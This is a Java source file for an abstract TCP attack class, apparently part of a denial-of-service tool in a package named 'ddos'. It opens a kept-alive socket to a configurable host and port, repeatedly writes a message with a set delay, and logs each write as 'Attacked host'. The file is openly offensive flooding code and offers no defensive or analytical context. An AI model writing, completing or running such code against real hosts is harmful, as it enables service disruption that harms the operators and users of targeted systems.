
package ddos.protocols.interfaces;

import ddos.DDOSPattern;
import ddos.DDOSer;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

public abstract class TCP extends DDOS {
    
    private Socket socket;

   
    public TCP(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }
    
    
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while(!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed()) && DDOSer.stopThread != true) {
            writeLineToSocket(getDdosPattern().getMessage());
            DDOSer.appendToConsole("Attacked host "+getDdosPattern().getHost()+":"+getDdosPattern().getPort());
            try {
                Thread.sleep(getDdosPattern().getTimeout());
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
        closeSocket();
    }
    
    /**
     * This method creates the socket.
     */
    protected void createSocket() {
        setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
        socket = new Socket();
        try {
            socket.setKeepAlive(true);
            socket.setSoTimeout(getDdosPattern().getSocketTimeout());
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
    }
    
    
    public abstract void writeLineToSocket(String message);
    
    protected void connectToSocket() {
        try {
            if(socket != null) socket.connect(getAddress());
        } catch(UnknownHostException ex) {
            DDOSer.appendToConsole("Error: Host "+getAddress()+" doesn´t exist!");
            ex.printStackTrace();
        } catch(SocketException ex) {
            DDOSer.appendToConsole("Error while creating or accessing a Socket!");
            closeSocket();
            ex.printStackTrace();
        } catch (IOException ex) {
            DDOSer.appendToConsole("Error while connecting a Socket!");
            ex.printStackTrace();
        }
    }
    
   
    protected void closeSocket() {
        try {
            if(socket != null && !socket.isClosed() && socket.isBound()) {
                socket.close();
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    
    public Socket getSocket() {
        return socket;
    }

    
    public void setSocket(Socket socket) {
        this.socket = socket;
    }
}
